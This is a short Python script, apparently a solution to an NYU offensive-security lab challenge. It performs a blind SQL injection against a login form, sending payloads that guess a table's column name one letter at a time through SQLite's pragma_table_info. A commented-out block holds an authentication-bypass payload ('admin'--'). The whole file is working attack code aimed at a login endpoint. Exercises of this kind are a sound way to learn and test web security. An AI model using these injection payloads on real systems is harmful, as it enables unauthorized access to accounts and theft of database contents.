import requests

cookies = {'CHALBROKER_USER_ID': 'os2178'}

for i in range(97, 123):
    payload = {'username': "admin' AND (SUBSTR((SELECT name FROM pragma_table_info('flag') LIMIT 1 OFFSET 0), 1, 1)='"
                + chr(i) + "')--", 'password': "password"}
    r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1505/login', cookies=cookies, data=payload)
    if not 'Invalid' in r.text:
        print(payload['username'])
        print(r.text)

# payload = {'username': "admin'--", 'password': "password"}
# print(payload['username'])
# r = requests.post('http://offsec-chalbroker.osiris.cyber.nyu.edu:1506/login', cookies=cookies, data=payload)
# print(r.text)